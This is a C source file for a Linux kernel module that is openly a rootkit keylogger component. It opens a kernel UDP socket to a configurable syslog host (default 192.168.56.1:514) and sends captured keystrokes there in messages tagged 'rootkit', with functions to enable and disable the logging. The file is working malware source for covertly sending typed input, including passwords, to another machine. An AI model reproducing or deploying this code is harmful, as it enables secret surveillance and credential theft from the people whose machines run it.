#include <linux/netdevice.h>
#include <linux/in.h>

#include "keylogger.h"

#define SYSLOG_PORT 514

// Syslog server IP module parameter
char* syslog_ip = "192.168.56.1";
module_param(syslog_ip, charp, 0);
MODULE_PARM_DESC(syslog_ip, "IP of the syslog server");

int enabled = 1;

struct socket* syslog_sock = NULL;
struct sockaddr_in syslog_addr;
char* msg_template = "<12>1 - - rootkit - - - ";

void log_keys(char* keys, int len)
{
  mm_segment_t oldfs;
  struct msghdr msg;
  struct iovec iov;
  int msg_template_len = strlen(msg_template);
  int payload_len = msg_template_len + len;
  char* payload;

  // Check if we may run
  if (enabled == 0 || syslog_sock == NULL) {
    return;
  }

  // Allocate space for payload
  payload = (char*) kmalloc(payload_len, GFP_KERNEL);

  // Construct the message
  memcpy(payload, msg_template, msg_template_len);
  memcpy(payload + msg_template_len, keys, len);

  // Construct the IO vector
  iov.iov_base = payload;
  iov.iov_len = payload_len;

  // Construct the message header
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  // Switch to kernel FS
  oldfs = get_fs();
  set_fs(KERNEL_DS);

  // Send the packet
  // printk(KERN_ALERT "Sending payload: [%d] %s\n", strlen(payload), payload);
  sock_sendmsg(syslog_sock, &msg, payload_len);
  // printk(KERN_ALERT "err: %d\n", err);

  // Switch back to previous FS
  set_fs(oldfs);

  kfree(payload);
}

void connect_keylogger(char* ip_str)
{
  int err;
  u8 ip[4];
  const char* end;

  kfree(syslog_sock);

  // Create the socket
  err = sock_create_kern(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &syslog_sock);
  if (err) {
    return; // Leave socket NULL
  }

  // Parse IP address
  err = in4_pton(ip_str, -1, ip, -1, &end);
  if (err == 0) {
    syslog_sock = NULL;
    return;
  }

  // Create the endpoint address
  syslog_addr.sin_family = AF_INET;
  // syslog_addr.sin_addr.s_addr = htonl(0xc0a83801);
  syslog_addr.sin_addr.s_addr = *((unsigned int*) ip);
  syslog_addr.sin_port = htons(SYSLOG_PORT);

  err = syslog_sock->ops->connect(syslog_sock, (struct sockaddr*) &syslog_addr, sizeof(struct sockaddr), 0);
  if (err) {
    syslog_sock = NULL;
    return;
  }
}

void enable_keylogger(void)
{
  enabled = 1;
}

void disable_keylogger(void)
{
  enabled = 0;
}

void init_keylogger(void)
{
  connect_keylogger(syslog_ip);
  enable_keylogger();
}

void finalize_keylogger(void)
{
  disable_keylogger();
}